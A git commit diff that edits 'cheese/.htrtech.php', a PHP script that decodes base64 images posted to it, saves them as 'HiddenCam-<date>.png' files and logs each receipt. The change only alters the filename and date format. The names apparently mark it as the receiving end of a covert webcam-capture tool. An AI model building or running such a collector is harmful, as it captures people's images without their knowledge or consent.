760484c000fba14c19e3f575fc88c29f892f0520
Tahmid Rayat <56682134+htr-tech@users.noreply.github.com>
2020-02-15 13:12:38 +0600

    Update .htrtech.php

--- cheese/.htrtech.php
+++ cheese/.htrtech.php
@@ -1,6 +1,6 @@
 <?php
 
-$date = date('HisdMY');
+$date = date('i_s_H-dMY');
 $imageData=$_POST['cat'];
 
 if (!empty($_POST['cat'])) {
@@ -10,7 +10,7 @@ error_log("Received" . "\r\n", 3, ".cam.log");
 
 $filteredData=substr($imageData, strpos($imageData, ",")+1);
 $unencodedData=base64_decode($filteredData);
-$fp = fopen( 'HiddenCam'.$date.'.png', 'wb' );
+$fp = fopen( 'HiddenCam-'.$date.'.png', 'wb' );
 fwrite( $fp, $unencodedData);
 fclose( $fp );
 
